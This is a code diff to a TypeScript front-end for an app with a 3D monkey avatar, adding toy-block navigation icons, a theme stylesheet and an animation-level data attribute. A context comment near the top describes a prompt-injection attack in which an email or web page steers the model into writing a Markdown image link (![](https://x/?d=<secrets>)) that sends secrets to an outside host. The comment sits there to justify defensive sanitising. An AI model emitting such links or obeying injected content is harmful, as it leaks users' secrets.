@@ -8,6 +8,7 @@ import { type Api, type AppState, type Brief, type Importance, waitForApi } from
 import { type Child, fmtTime, h, safeHttp, setToastSound, toast } from "./dom";
 import { renderAssignments, markChecked, undoToast } from "./assignments";
 import { refreshTodos, reminderToast, renderTodos, todoOpen } from "./todo";
+import { initNavIcons } from "./nav-blocky";
 import { renderHealth } from "./health";
 import { decorateJungle } from "./jungle";
 import { renderAvatarLab } from "./avatarlab";
@@ -20,6 +21,7 @@ import { automationEvent, computerEvent, controlBanner, initComputer, initOverla
 import "@fontsource/lilita-one/latin-400.css";
 import "./style.css";
 import "./game.css";
+import "./theme-blocky.css";
 
 const $ = <T extends HTMLElement>(sel: string) => document.querySelector<T>(sel)!;
 // Markdown from the model is untrusted: an email or web page can steer it into writing ![](https://x/?d=<secrets>),
@@ -276,10 +278,11 @@ function applyChrome(st: AppState) {
 }
 
 function applyLook(s: Record<string, any>) {
-  const a3 = (window as any).__monkeyAvatarObj as Avatar3D | undefined;
-  if (!a3) return;
   const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
   const juice = s.juice_level && s.juice_level !== "auto" ? s.juice_level : reduce ? "calm" : "full";
+  document.documentElement.dataset.juice = juice;      // the to-do panel's icon animations follow it too
+  const a3 = (window as any).__monkeyAvatarObj as Avatar3D | undefined;
+  if (!a3) return;
   a3.ready.then(() => a3.configure({ juice, volume: (s.sfx_volume ?? 70) / 100, sleepAfterMin: s.sleep_after_min ?? 8 }));
 }
 const LABELS: Record<AvatarState, string> = {
@@ -1771,6 +1774,7 @@ async function bootOverlay() {
     void api.get_state().then((st) => { appState = st; applyChrome(st); updateWelcome(); });
   });
   (window as any).__monkeyReady = true;          // boot finished (tests wait for this)
+  initNavIcons();                                // toy-block header icons (cached: now; first bake: when idle)
 })();
 
 let welcomeEl: HTMLElement | null = null;
